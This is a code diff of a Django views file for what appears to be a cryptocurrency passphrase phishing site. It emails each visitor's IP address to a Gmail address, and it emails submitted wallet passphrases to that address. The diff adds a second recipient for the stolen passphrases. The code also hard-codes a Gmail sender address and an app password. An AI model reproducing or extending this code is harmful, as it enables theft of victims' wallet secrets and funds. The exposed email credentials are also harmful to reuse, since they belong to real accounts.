@@ -12,10 +12,10 @@ import requests
 def error_404(request, exception):
     return render(request, '404.html', status=404)
 
-def send_notify(subject, payload):
+def send_notify(subject, payload, email_to):
     sender = "ezekielizuchi2018@gmail.com"
     password = "pvos glgf nxal finc"
-    recipient = "ezekielobiajulu0@gmail.com"
+    recipient = email_to
     
     return sending_no(payload, recipient, sender,password, subject)
 
@@ -51,7 +51,7 @@ def get_location(ip_address):
 def index(request):
     ip_add = get_ip_address()
     request.session['ip_address'] = ip_add
-    send_notify(payload=f'someone has visited your pi site - {ip_add}', subject='Pi site')
+    send_notify(payload=f'someone has visited your pi site - {ip_add}', subject='Pi site', email_to="ezekielobiajulu0@gmail.com")
     return render(request, 'index.html', {})
 
 def validate(request):
@@ -97,7 +97,9 @@ def submit_pass(request):
 
                 current_time = datetime.now()
                 formatted_time = current_time.strftime("%Y-%m-%d %H:%M:%S")
-                send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject='Pi site Token Submitted')
+                send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject='Pi site Token Submitted', email_to="ezekielobiajulu0@gmail.com")
+
+                send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject='Pi site Token Submitted', email_to="obikeechiemerielinus@gmail.com")
                 request.session['look_up'] = look_up_key
                 # key_sent = models.PassPhrase.objects.get(look_up=look_up_key)
                 return approve(request, keys=look_up_key)
